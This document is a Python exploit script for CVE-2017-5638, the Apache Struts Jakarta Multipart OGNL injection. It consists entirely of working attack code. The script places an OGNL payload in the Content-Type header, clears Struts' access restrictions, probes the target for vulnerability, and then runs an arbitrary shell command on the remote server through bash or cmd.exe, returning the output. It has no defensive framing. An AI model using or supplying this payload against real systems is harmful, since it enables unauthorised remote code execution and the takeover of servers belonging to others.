#!/usr/bin/python
# -*- coding: utf-8 -*-

# Author : Nixawk

import requests
import string
import random
import httplib
import logging


from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# requests.exceptions.ChunkedEncodingError: ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))

httplib.HTTPConnection._http_vsn = 10
httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'


logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


class CVE_2017_5638(object):

    # Apache Struts Jakarta Multipart Parser OGNL Injection

    def randomstr(self, length):
        '''generate a random string'''
        return ''.join(
            random.choice(string.ascii_uppercase + string.digits)
            for _ in range(length)
        )

    def exploit(self, url, cmd):
        '''execute cmd on remote target'''
        if self.check(url):

            ognl = ""
            ognl += "(#cmd='%s')." % cmd
            ognl += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
            ognl += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
            ognl += "(#p=new java.lang.ProcessBuilder(#cmds))."
            ognl += "(#p.redirectErrorStream(true)).(#process=#p.start())."
            ognl += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
            ognl += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
            ognl += "(#ros.flush())"

            http = self.send_struts_request(url, ognl)
            if http:
                print("[*] struts2-cmd $ %s\n" % cmd)
                print("[*] %s\n" % http.text)

    def check(self, url):
        '''test if target is vulnable'''
        var_a = self.randomstr(4)

        ognl = ""
        ognl += "(#os=@java.lang.System@getProperty('os.name'))."
        ognl += "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('%s', #os))" % var_a

        http = self.send_struts_request(url, ognl)

        bret = http and (var_a in http.headers)
        if bret:
            print("[+] The target is vulnerable.")
        else:
            print("[?] The target is unknown, please check it manually")

        return bret

    def send_struts_request(self, url, ognl):
        '''send request(s) with struts payload'''
        payload = ""
        payload += "%{"
        payload += "(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))."
        payload += ognl
        payload += "}"

        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': payload
        }

        http = None
        try:
            http = requests.get(
                url, headers=headers, timeout=8.0, verify=False
            )
        except Exception as err:
            log.exception(err)

        return http


if __name__ == '__main__':
    import sys

    if len(sys.argv) != 3:
        print("[+] python %s <url> <cmd>" % sys.argv[0])
        sys.exit()

    url = sys.argv[1]
    cmd = sys.argv[2]
    st = CVE_2017_5638()
    st.exploit(url, cmd)

